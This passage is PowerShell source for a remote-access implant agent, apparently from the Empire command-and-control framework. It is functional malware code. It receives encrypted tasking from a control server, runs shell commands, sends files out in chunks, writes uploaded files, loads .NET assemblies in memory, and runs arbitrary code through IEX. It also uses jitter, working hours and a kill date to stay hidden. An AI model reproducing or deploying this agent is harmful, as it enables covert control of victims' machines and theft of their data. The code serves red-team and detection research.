        $ProfileParts = $Profile.split('|');
        $script:TaskURIs = $ProfileParts[0].split(',');
        $script:UserAgent = $ProfileParts[1];
        $script:SessionID = $SessionID;
        $script:Headers = @{};
        if($ProfileParts[2]) {
            $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
                $Parts = $_.Split(':');
                $script:Headers.Add($Parts[0],$Parts[1]);
            }
        }
        "Agent updated with profile $Profile";
    }
    function Get-FilePart {
        Param(
            [string] $File,
            [int] $Index = 0,
            $ChunkSize = 512KB,
            [switch] $NoBase64
        )
        try {
            $f = Get-Item "$File";
            $FileLength = $f.length;
            $FromFile = [io.file]::OpenRead($File);
            if ($FileLength -lt $ChunkSize) {
                if($Index -eq 0) {
                    $buff = new-object byte[] $FileLength;
                    $count = $FromFile.Read($buff, 0, $buff.Length);
                    if($NoBase64) {
                        $buff;
                    }
                    else{
                        [System.Convert]::ToBase64String($buff);
                    }
                }
                else{
                    $Null;
                }
            }
            else{
                $buff = new-object byte[] $ChunkSize;
                $Start = $Index * $($ChunkSize);
                $null = $FromFile.Seek($Start,0);
                $count = $FromFile.Read($buff, 0, $buff.Length);
                if ($count -gt 0) {
                    if($count -ne $ChunkSize) {
                        $buff2 = new-object byte[] $count;
                        [array]::copy($buff, $buff2, $count);
                        if($NoBase64) {
                            $buff2
                        }
                        else{
                            [System.Convert]::ToBase64String($buff2);
                        }
                    }
                    else{
                        if($NoBase64) {
                            $buff;
                        }
                        else{
                            [System.Convert]::ToBase64String($buff);
                        }
                    }
                }
                else{
                    $Null;
                }
            }
        }
        catch{}
        finally {
            $FromFile.Close();
        }
    }
    function Encrypt-Bytes {
        param($bytes)
        $IV = [byte] 0..255 | Get-Random -count 16;
        try {
            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        }
        catch {
            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
        }
        $AES.Mode = "CBC";
        $AES.Key = $Encoding.GetBytes($SessionKey);
        $AES.IV = $IV;
        $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
        $HMAC.Key = $Encoding.GetBytes($SessionKey);
        $ciphertext + $hmac.ComputeHash($ciphertext)[0..9];
    }
    function Decrypt-Bytes {
        param ($inBytes)
        if($inBytes.Length -gt 32) {
            $mac = $inBytes[-10..-1];
            $inBytes = $inBytes[0..($inBytes.length - 11)];
            $hmac.Key = $Encoding.GetBytes($SessionKey);
            $expected = $hmac.ComputeHash($inBytes)[0..9];
            if (@(Compare-Object $mac $expected -sync 0).Length -ne 0) {
                return;
            }
            $IV = $inBytes[0..15];
            try {
                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            }
            catch {
                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
            }
            $AES.Mode = "CBC";
            $AES.Key = $Encoding.GetBytes($SessionKey);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
        }
    }
    function New-RoutingPacket {
        param($EncData, $Meta)
        if($EncData) {
            $EncDataLen = $EncData.Length;
        }
        else {
            $EncDataLen = 0;
        }
        $SKB = $Encoding.GetBytes($StagingKey);
        $IV=[BitConverter]::GetBytes($(Get-Random));
        $Data = $Encoding.GetBytes($script:SessionID) + @(0x01,$Meta,0x00,0x00) + [BitConverter]::GetBytes($EncDataLen);
        $RoutingPacketData = ConvertTo-Rc4ByteStream -In $Data -RCK $($IV+$SKB);
        if($EncData) {
            ($IV + $RoutingPacketData + $EncData);
        }
        else {
            ($IV + $RoutingPacketData);
        }
    }
    function Decode-RoutingPacket {
        param($PacketData)
        if ($PacketData.Length -ge 20) {
            $Offset = 0;
            while($Offset -lt $PacketData.Length) {
                $RoutingPacket = $PacketData[($Offset+0)..($Offset+19)];
                $RoutingIV = $RoutingPacket[0..3];
                $RoutingEncData = $RoutingPacket[4..19];
                $Offset += 20;
                $SKB = $Encoding.GetBytes($StagingKey);
                $RoutingData = ConvertTo-Rc4ByteStream -In $RoutingEncData -RCK $($RoutingIV+$SKB);
                $PacketSessionID = [System.Text.Encoding]::UTF8.GetString($RoutingData[0..7]);
                $Language = $RoutingData[8];
                $Meta = $RoutingData[9];
                $Extra = $RoutingData[10..11];
                $PacketLength = [BitConverter]::ToUInt32($RoutingData, 12);
                if ($PacketLength -lt 0) {
                    break;
                }
                if ($PacketSessionID -eq $script:SessionID) {
                    $EncData = $PacketData[$Offset..($Offset+$PacketLength-1)];
                    $Offset += $PacketLength;
                    Process-TaskingPackets $EncData;
                }
                else {
                }
            }
        }
        else {
        }
    }
    function Encode-Packet {
        param([Int16]$type, $data, [Int16]$ResultID=0)
        if ($data -is [System.Array]) {
            $data = $data -join "`n";
        }
        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));
        $packet = New-Object Byte[] (12 + $data.Length);
        ([BitConverter]::GetBytes($type)).CopyTo($packet, 0);
        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 2);
        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 4);
        ([BitConverter]::GetBytes($ResultID)).CopyTo($packet, 6);
        ([BitConverter]::GetBytes($data.Length)).CopyTo($packet, 8);
        ([System.Text.Encoding]::UTF8.GetBytes($data)).CopyTo($packet, 12);
        $packet;
    }
    function Decode-Packet {
        param($packet, $offset=0)
        $Type = [BitConverter]::ToUInt16($packet, 0+$offset);
        $TotalPackets = [BitConverter]::ToUInt16($packet, 2+$offset);
        $PacketNum = [BitConverter]::ToUInt16($packet, 4+$offset);
        $TaskID = [BitConverter]::ToUInt16($packet, 6+$offset);
        $Length = [BitConverter]::ToUInt32($packet, 8+$offset);
        $Data = [System.Text.Encoding]::UTF8.GetString($packet[(12+$offset)..(12+$Length+$offset-1)]);
        $Remaining = [System.Text.Encoding]::UTF8.GetString($packet[(12+$Length+$offset)..($packet.Length)]);
        Remove-Variable packet;
        @($Type, $TotalPackets, $PacketNum, $TaskID, $Length, $Data, $Remaining);
    }
    function Process-Tasking {
        param($type, $msg, $ResultID)
        try {
            $script:tasks[$ResultID] = @{
                "result_id" = $ResultID
                "packet_type" = $type
                "status" = "started"
                "thread" = $null
                "language" = $null
                "powershell" = @{
                    "app_domain" = $null
                    "ps_host" = $null
                    "buffer" = $null
                    "ps_host_exec" = $null
                }
            }
            if($type -eq 1) {
                $script:tasks[$ResultID]['status'] = 'completed'
                return Encode-Packet -type $type -data $(Get-Sysinfo) -ResultID $ResultID;
            }
            elseif($type -eq 2) {
                $msg = "[!] Agent "+$script:SessionID+" exiting";
                (& $SendMessage -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID));
                exit;
            }
            elseif($type -eq 34) {
                Encode-Packet -type 0 -data '[!] Proxy chain not implemented' -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'unimplemented'
            }
            elseif($type -eq 40) {
                $parts = $data.Split(" ");
                if($parts.Length -eq 1) {
                    $cmd = $parts[0];
                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim() -ResultID $ResultID;
                }
                else{
                    $cmd = $parts[0];
                    $cmdargs = $parts[1..$parts.length] -join " ";
                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim() -ResultID $ResultID;
                }
                $script:tasks[$ResultID]['status'] = 'completed'
            }
            elseif($type -eq 41) {
                try {
                    $ChunkSize = 512KB;
                    $Parts = $Data.Split(" ");
                    if($Parts.Length -gt 1) {
                        $Path = $Parts[0..($parts.length-2)] -join " ";
                        try {
                            $ChunkSize = $Parts[-1]/1;
                            if($Parts[-1] -notlike "*b*") {
                                $ChunkSize = $ChunkSize * 1024;
                            }
                        }
                        catch {
                            $Path += " $($Parts[-1])";
                        }
                    }
                    else {
                        $Path = $Data;
                    }
                    $Path = $Path.Trim('"').Trim("'");
                    if($ChunkSize -lt 512KB) {
                        $ChunkSize = 512KB;
                    }
                    elseif($ChunkSize -gt 8MB) {
                        $ChunkSize = 8MB;
                    }
                    else {
                        $ChunkSize = 1024KB;
                    }
                    $Path = Get-Childitem -Recurse $Path -File  | ForEach-Object {$_.FullName};
                    foreach ( $File in $Path) {
                        $Index = 0;
                        do{
                            $EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize;
                            $filesize = (Get-Item $file).length;
                            if($EncodedPart) {
                                $data = "{0}|{1}|{2}|{3}" -f $Index, $file, $filesize, $EncodedPart;
                                (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID));
                                $Index += 1;
                                if ($script:AgentDelay -ne 0) {
                                    $min = [int]((1-$script:AgentJitter)*$script:AgentDelay);
                                    $max = [int]((1+$script:AgentJitter)*$script:AgentDelay);
                                    if ($min -eq $max) {
                                        $sleepTime = $min;
                                    }
                                    else{
                                        $sleepTime = Get-Random -minimum $min -maximum $max;
                                    }
                                    Start-Sleep -s $sleepTime;
                                }
                            }
                            [GC]::Collect();
                        } while($EncodedPart)
                        Encode-Packet -type 40 -data "[*] File download of $file completed" -ResultID $ResultID;
                        $script:tasks[$ResultID]['status'] = 'completed'
                    }
                }
                catch {
                    Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'error'
                }
            }
            elseif($type -eq 42) {
                $parts = $data.split('|');
                $filename = $parts[0];
                $base64part = $parts[1];
                $Content = [System.Convert]::FromBase64String($base64part);
                try{
                    Set-Content -Path $filename -Value $Content -Encoding Byte -ErrorAction Stop -ErrorVariable error
                    Encode-Packet -type $type -data "[*] Upload of $fileName successful" -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'completed'
                }
                catch {
                    Encode-Packet -type 0 -data $error -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'error'
                }
            }
            elseif($type -eq 43) {
                $output = "";
                $path = "/";
                if ($data.length -gt 1) {
                    $path = $data;
                }
                if ($path -eq "/") {
                    $array = @();
                    $drives = Get-PSDrive -PSProvider FileSystem |where {($_.Used -gt 0)} | ForEach-Object {
                        $array += (@{path =  $_.Root; name = $_.Root; is_file = $false});
                    }
                    $output = @{directory_name = "/"; directory_path = "/"; items = $array} | ConvertTo-Json -Compress;
                } elseif (-Not (Test-Path $path -PathType Container)) {
                    $output = "Directory " + $path + " not found.";
                } else {
                    $array = @();
                    Get-ChildItem -force -Path $path -Attributes !directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $true }) };
                    Get-ChildItem -force -Path $path -Attributes directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $false }) };
                    $directory = Get-Item -force -Path $path;
                    $output = @{ directory_name = $directory.Name; directory_path = $directory.FullName; items = $array } | ConvertTo-Json -Compress;
                    if ($directory -eq $null)
                    {
                        $output = "User does not have access to directory " + $path;
                    }
                }
                Encode-Packet -data $output -type $type -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'completed'
            }
            elseif($type -eq 120){
                try {
                    $parts = $data.split(",")
                    $base64String = $parts[1..$parts.length] -join ''
                    $jsonString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64String))
                    $jsonObject = $jsonString | ConvertFrom-Json
                    $commandArray = @()
                    foreach ($keyValue in $jsonObject.PSObject.Properties) {
                        $commandArray += $keyValue.Value
                    }
                    $arguments = @(,[string[]]$commandArray)
                    $bytes = [System.Convert]::FromBase64String($parts[0]);
                    $ms = New-Object System.IO.MemoryStream
                    $output = New-Object System.IO.MemoryStream
                    $ms.Write($bytes, 0, $bytes.Length)
                    $ms.Seek(0,0) | Out-Null
                    $sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
                    $buffer = [System.Byte[]]::CreateInstance([System.Byte], 4096)
                    $bytesRead = $sr.Read($buffer, 0, $buffer.length)
                    while ($bytesRead -ne 0) {
                        $output.Write($buffer, 0, $bytesRead)
                        $bytesRead = $sr.Read($buffer, 0, $buffer.length)
                    }
                    $assemBytes = $output.ToArray()
                    $assembly = [Reflection.Assembly]::Load($assemBytes)
                    $programType = $assembly.GetType("Program")
                    $mainMethod = $programType.GetMethod("Main")
                    $streamProp = $programType.GetProperty("OutputStream");
                    if ($streamProp) {
                        $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable)
                        $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle)
                        $streamReader = [System.IO.StreamReader]::new($pipeServerStream)
                        $ps = [PowerShell]::Create()
                        $dict = @{
                            "assembly" = $assembly;
                            "args"     = $commandArray;
                            "pipe"     = $pipeClientStream;
                        }
                        $pipeOutput = New-Object System.IO.StringWriter
                        $originalConsoleOut = [Console]::Out
                        try {
                            $task = $ps.AddScript('
                                [CmdletBinding()]
                                param(
                                    [System.Reflection.Assembly]
                                    $assembly,
                                    [String[]]
                                    $args,
                                    [IO.Pipes.AnonymousPipeClientStream]
                                    $pipe
                                )
                                try {
                                    $writer = New-Object System.IO.StreamWriter($pipe)
                                    $writer.AutoFlush = $true
                                    $writer.WriteLine("ready")
                                    Start-Sleep -Milliseconds 1000
                                    $arguments = @(,[string[]]$args)
                                    $streamProp = $assembly.GetType("Program").GetProperty("OutputStream")
                                    $streamProp.SetValue($null, $pipe, $null)
                                    $pipeWriter = New-Object System.IO.StreamWriter($pipe)
                                    $pipeWriter.AutoFlush = $true
                                    [Console]::SetOut($pipeWriter)
                                    $assembly.GetType("Program").GetMethod("Main").Invoke($null, $arguments)
                                }
                                finally {
                                    $pipe.Dispose()
                                }
                            ').AddParameters($dict).BeginInvoke()
                            $readyMessage = $streamReader.ReadLine()
                            if ($readyMessage -eq "ready") {
                                $buffer = [char[]]::new($pipeServerStream.InBufferSize)
                                while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
                                    $pipeOutput.Write($buffer, 0, $read)
                                    $output = $pipeOutput.ToString().TrimEnd()
                                    if (-not [string]::IsNullOrWhiteSpace($output)) {
                                        Encode-Packet -data $output -type 120 -ResultID $ResultID;
                                    }
                                }
                            }
                        }
                        finally {
                            $ps.EndInvoke($task)
                            [Console]::SetOut($originalConsoleOut)
                            $pipeOutput.Close()
                            $script:tasks[$ResultID]['status'] = 'completed';
                        }
                    }
                    else {
                        $OldConsoleOut = [Console]::Out;
                        $StringWriter = New-Object IO.StringWriter;
                        [Console]::SetOut($StringWriter);
                        $null = $mainMethod.Invoke($null, $arguments)
                        [Console]::SetOut($OldConsoleOut)
                        $result = $StringWriter.ToString()
                        Encode-Packet -data $result -type 120 -ResultID $ResultID;
                        $script:tasks[$ResultID]['status'] = 'completed';
                    }
                }
                catch {
                    Write-Host "Error while executing assembly: $_"
                    Encode-Packet -type 0 -data "[!] Error while executing assembly: $_" -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'error';
                }
            }
            elseif ($type -eq 122) {
                try {
                    $parts = $data.split(",")
                    $base64String = $parts[1..$parts.length] -join ''
                    $jsonString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64String))
                    $jsonObject = $jsonString | ConvertFrom-Json
                    $commandArray = @()
                    foreach ($keyValue in $jsonObject.PSObject.Properties) {
                        $commandArray += $keyValue.Value
                    }
                    $bytes = [System.Convert]::FromBase64String($parts[0]);
                    $ms = New-Object System.IO.MemoryStream;
                    $output = New-Object System.IO.MemoryStream;
                    $ms.Write($bytes, 0, $bytes.Length);
                    $ms.Seek(0, 0) | Out-Null;
                    $sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress);
                    $buffer = [System.Byte[]]::CreateInstance([System.Byte], 4096);
                    $bytesRead = $sr.Read($buffer, 0, $buffer.Length);
                    while ($bytesRead -ne 0) {
                        $output.Write($buffer, 0, $bytesRead);
                        $bytesRead = $sr.Read($buffer, 0, $buffer.Length);
                    }
                    $assemBytes = $output.ToArray();
                    $assembly = [Reflection.Assembly]::Load($assemBytes)
                    $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable);
                    $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle);
                    $ps = [PowerShell]::Create();
                    $dict = @{
                        "assembly" = $assembly;
                        "args"     = $commandArray;
                        "pipe"     = $pipeClientStream;
                    }
                    $task = $ps.AddScript('
                        [CmdletBinding()]
                        param(
                            [System.Reflection.Assembly]
                            $assembly,
                            [String[]]
                            $args,
                            [IO.Pipes.AnonymousPipeClientStream]
                            $pipe
                        )
                        try {
                            $writer = New-Object System.IO.StreamWriter($pipe)
                            $writer.AutoFlush = $true
                            $writer.WriteLine("ready")
                            Start-Sleep -Milliseconds 1000
                            $arguments = @(,[string[]]$args)
                            $streamProp = $assembly.GetType("Program").GetProperty("OutputStream")
                            if ($streamProp) {
                                $streamProp.SetValue($null, $pipe, $null)
                            }
                            $pipeWriter = New-Object System.IO.StreamWriter($pipe)
                            $pipeWriter.AutoFlush = $true
                            $originalConsoleOut = [Console]::Out
                            [Console]::SetOut($pipeWriter)
                            $assembly.GetType("Program").GetMethod("Main").Invoke($null, $arguments)
                        }
                        finally {
                            $pipe.Dispose()
                            [Console]::SetOut($originalConsoleOut)
                        }
                    ').AddParameters($dict).BeginInvoke()
                    $scriptString = {
                        param($pipeServerStream, $ps, $task)
                        try {
                            $outputCollector = [Text.StringBuilder]::new()
                            $streamReader = New-Object System.IO.StreamReader($pipeServerStream)
                            $readyMessage = $streamReader.ReadLine()
                            $buffer = [char[]]::new($pipeServerStream.InBufferSize)
                            if ($readyMessage -eq "ready") {
                                while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
                                    if ($read -gt 0) {
                                        $outputChunk = -join $buffer[0..($read - 1)]
                                        [void]$outputCollector.Append($outputChunk)
                                    }
                                }
                                $output = $outputCollector.ToString().TrimEnd()
                                if (-not [string]::IsNullOrWhiteSpace($output)) {
                                    $output
                                }
                            }
                        }
                        finally {
                            $ps.EndInvoke($task)
                            $script:tasks[$ResultID]['status'] = 'completed';
                        }
                    }
                    $AppDomain = [AppDomain]::CreateDomain($ResultID);
                    $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();
                    $parameters = @{
                        "pipeServerStream" = $pipeServerStream;
                        "ps"               = $ps;
                        "task"             = $task;
                    }
                    $null = $PSHost.AddScript($ScriptString).AddParameters($parameters)
                    $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]';
                    $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]';
                    $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]));
                    $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)));
                    $Script:tasks[$ResultID] = @{
                        "result_id" = $ResultID
                        "packet_type" = $type
                        "status" = "running"
                        "thread" = $Job
                        "language" = $null
                        "powershell" = @{
                            "app_domain" = $AppDomain
                            "ps_host" = $PSHost
                            "buffer" = $Buffer
                            "ps_host_exec" = $null
                        }
                    }
                    $script:tasks[$ResultID]['status'] = 'running';
                    $script:ResultIDs[$ResultID] = $ResultID;
                    Encode-Packet -type $type -data ("Job started: " + $ResultID) -ResultID $ResultID;
                } catch {
                    $errorMessage = $_.Exception.Message;
                    Encode-Packet -type 0 -data "[!] Error while executing assembly: $errorMessage" -ResultID $ResultID;
                    if ($script:tasks[$ResultID]) {
                        $script:tasks[$ResultID]['status'] = 'error';
                    }
                }
            }
            elseif($type -eq 50) {
                $taskLines = @("Task ID | Status")
                $taskLines += "-" * 20
                foreach ($task_id in $script:tasks.Keys) {
                    $task_info = $script:tasks[$task_id]
                    $taskLine = "$task_id | $($task_info.status)"
                    $taskLines += $taskLine
                }
                $tasksOutput = $taskLines -join "`n"
                Encode-Packet -data ("`n$tasksOutput") -type $type -ResultID $ResultID
                $script:tasks[$ResultID]['status'] = 'completed'
            }
            elseif($type -eq 51) {
                $JobName = $data;
                $JobResultID = $ResultIDs[$JobName];
                try {
                    $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
                    if($Results -and $($Results.trim() -ne '')) {
                        Encode-Packet -type $type -data $($Results) -ResultID $JobResultID;
                    }
                    Encode-Packet -type 51 -data "Job $JobName killed." -ResultID $JobResultID;
                    $script:tasks[$ResultID]['status'] = 'completed'
                }
                catch {
                    Encode-Packet -type 0 -data "[!] Error in stopping job: $JobName" -ResultID $JobResultID;
                    $script:tasks[$ResultID]['status'] = 'error'
                }
            }
            elseif($type -eq 60) {
                Encode-Packet -type 0 -data '[!] SOCKS server not implemented' -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'unimplemented'
            }
            elseif($type -eq 61) {
                Encode-Packet -type 0 -data '[!] SOCKS server data not implemented' -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'unimplemented'
            }
            elseif($type -eq 100) {
                $ResultData = IEX $data;
                if($ResultData) {
                    Encode-Packet -type $type -data $ResultData -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'completed'
                }
            }
            elseif($type -eq 101) {
                $prefix = $data.Substring(0,15);
                $extension = $data.Substring(15,5);
                $data = $data.Substring(20);
                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data)) -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'completed'
            }
            elseif($type -eq 102) {
                $jobID = Start-AgentJob $data;
                $script:ResultIDs[$jobID]=$resultID;
                Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'running'
            }
            elseif($type -eq 220) {
                try {
                    IEX $data
                    Encode-Packet -type $type -data "[+] Switched the current listener to: $CurrentListenerName" -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'completed'
                }
                catch {
                    Encode-Packet -type 0 -data ("[!] Unable to update agent comm methods: $_") -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'error'
                }
            }
            elseif($type -eq 221) {
                $script:CurrentListenerName = $data;
                Encode-Packet -type $type -data "[+] Updated the CurrentListenerName to: $CurrentListenerName" -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'completed'
            }
            else{
                Encode-Packet -type 0 -data "[!] invalid type: $type" -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'error'
            }
        }
        catch [System.Exception] {
            Encode-Packet -type $type -data "[!] error running command: $_" -ResultID $ResultID;
            $script:tasks[$ResultID]['status'] = 'error'
        }
    }
    function Process-TaskingPackets {
        param($Tasking)
        $TaskingBytes = Decrypt-Bytes $Tasking;
        if (-not $TaskingBytes) {
            return;
        }
        $Decoded = Decode-Packet $TaskingBytes;
        $Type = $Decoded[0];
        $TotalPackets = $Decoded[1];
        $PacketNum = $Decoded[2];
        $TaskID = $Decoded[3];
        $Length = $Decoded[4];
        $Data = $Decoded[5];
        $Remaining = $Decoded[6];
        $ResultPackets = $(Process-Tasking $Type $Data $TaskID);
        $Offset = 12 + $Length;
        while($Remaining.Length -ne 0) {
            $Decoded = Decode-Packet $TaskingBytes $Offset;
            $Type = $Decoded[0];
            $TotalPackets = $Decoded[1];
            $PacketNum = $Decoded[2];
            $TaskID = $Decoded[3];
            $Length = $Decoded[4];
            $Data = $Decoded[5];
            if ($Decoded.Count -eq 7) {$Remaining = $Decoded[6]};
            $ResultPackets += $(Process-Tasking $Type $Data $TaskID);
            $Offset += $(12 + $Length);
        }
        (& $SendMessage -Packets $ResultPackets);
    }
    while ($True) {
        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) -or ((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit)) ) {
            $Packets = $null;(& $GetTask);
            ForEach($JobName in $script:tasks.Keys) {
                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
                $JobResultID = $script:ResultIDs[$JobName];
                $Packets += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID);
                $script:ResultIDs.Remove($JobName);
            }
            if ($Packets) {
                (& $SendMessage -Packets $Packets);
            }
            if (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) {
                $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate";
            }
            else {
                $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached";
            }
            (& $SendMessage -Packets $(Encode-Packet -type 2 -data $msg));
            exit;
        }
        if ($script:WorkingHours -match '^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]$') {
            $current = Get-Date;
            $start = Get-Date ($script:WorkingHours.split("-")[0]);
            $end = Get-Date ($script:WorkingHours.split("-")[1]);
            if (($end-$start).hours -lt 0) {
                $start = $start.AddDays(-1);
            }
            $startCheck = $current -ge $start;
            $endCheck = $current -le $end;
            if ((-not $startCheck) -or (-not $endCheck)) {
                $sleepSeconds = ($start - $current).TotalSeconds;
                if($sleepSeconds -lt 0) {
                    $sleepSeconds = ($start.addDays(1) - $current).TotalSeconds;
                }
                Start-Sleep -Seconds $sleepSeconds;
            }
        }
        if ($script:AgentDelay -ne 0) {
            $SleepMin = [int]((1-$script:AgentJitter)*$script:AgentDelay);
            $SleepMax = [int]((1+$script:AgentJitter)*$script:AgentDelay);
            if ($SleepMin -eq $SleepMax) {
                $SleepTime = $SleepMin;
            }
            else{
                $SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax;
            }
            Start-Sleep -Seconds $sleepTime;
        }
        $JobResults = $Null;
        $JobNames = $Script:tasks.Keys | ForEach-Object { $_ }
        ForEach($JobName in $JobNames) {
            $JobResultID = $script:ResultIDs[$JobName]
            $taskStatus = $script:tasks[$JobName]['status']
            if ($taskStatus -eq 'completed' -or $taskStatus -eq 'stopped') {
                continue;  # Skip already completed or stopped tasks
            }
            if ($taskStatus -eq 'running') {
                $jobCompleted = Get-AgentJobCompleted -JobName $JobName
                if ($jobCompleted) {
                    $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
                }
                else {
                    $Results = Receive-AgentJob -JobName $JobName | fl | Out-String
                }
            }
            if ($Results) {
                $JobResults += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID)
            }
        }
        if ($JobResults) {
            ((& $SendMessage -Packets $JobResults));
        }
        $TaskData = (& $GetTask);
        if ($TaskData) {
            $script:MissedCheckins = 0;
            if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $script:DefaultResponse) {
                Decode-RoutingPacket -PacketData $TaskData;
            }
        }
        [GC]::Collect();
    }
}
